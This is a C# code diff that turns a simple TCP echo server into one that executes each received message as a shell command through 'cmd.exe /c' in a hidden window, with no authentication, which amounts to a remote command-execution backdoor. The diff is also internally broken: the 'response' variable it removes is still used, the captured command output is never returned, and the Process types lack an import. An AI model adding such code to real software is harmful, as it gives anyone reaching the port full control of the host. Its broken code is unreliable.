@@ -2,6 +2,7 @@
 ﻿using System;
 using System.Net;
 using System.Net.Sockets;
+using System.Text;
 
 class Server
 {
@@ -15,12 +16,27 @@ class Server
         TcpClient client = listener.AcceptTcpClient();
         Console.WriteLine("Client connected!");
         byte[] buffer = new byte[1024];
+
         int bytesRead = stream.Read(buffer, 0, buffer.Length);
+        
+        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+        Console.WriteLine("Command: " + command);
+       
+        ProcessStartInfo psi = new ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = "/c " + command,
+            RedirectStandardOutput = true,
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+        Process process = new Process();
+        process.StartInfo = psi;
+        process.Start();
 
-        string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
-        Console.WriteLine("Received: " + message);
+        string output = process.StandardOutput.ReadToEnd();
+        process.WaitForExit();
 
-        string response = "Server received: " + message;
         byte[] data = Encoding.UTF8.GetBytes(response);
 
         stream.Write(data, 0, data.Length);
